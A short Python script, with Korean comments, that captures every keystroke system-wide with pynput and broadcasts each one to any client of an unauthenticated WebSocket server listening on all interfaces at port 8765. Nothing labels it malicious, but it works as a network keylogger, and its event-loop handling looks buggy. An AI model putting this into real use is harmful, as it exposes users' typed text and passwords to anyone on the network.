import asyncio
import websockets
from pynput import keyboard

connected_clients = set()

# WebSocket 서버: 연결된 클라이언트 관리
async def handler(websocket, path="/"):
    print("📡 Client connected")
    connected_clients.add(websocket)
    try:
        await websocket.wait_closed()
    except Exception as e:
        print(f"🔥 WebSocket error: {e}")
    finally:
        connected_clients.remove(websocket)
        print("❌ Client disconnected")

# 키 입력 감지 함수
def on_press(key):
    try:
        text = key.char
    except AttributeError:
        text = f"[{key.name}]"  # 특수 키
        print(f"입력됨: {text}")
    asyncio.run(send_to_all(text))

# 모든 연결된 클라이언트에 메시지 전송
async def send_to_all(message):
    print(f"📤 Sending to {len(connected_clients)} clients: {message}")  # 로그 추가
    await asyncio.gather(*(ws.send(message) for ws in connected_clients))

# 서버 실행
async def main():
    print("🚀 WebSocket server running on ws://0.0.0.0:8765")
    async with websockets.serve(handler, "0.0.0.0", 8765):
        with keyboard.Listener(on_press=on_press) as listener:
            await asyncio.Future()  # 서버 계속 유지

if __name__ == "__main__":
    asyncio.run(main())
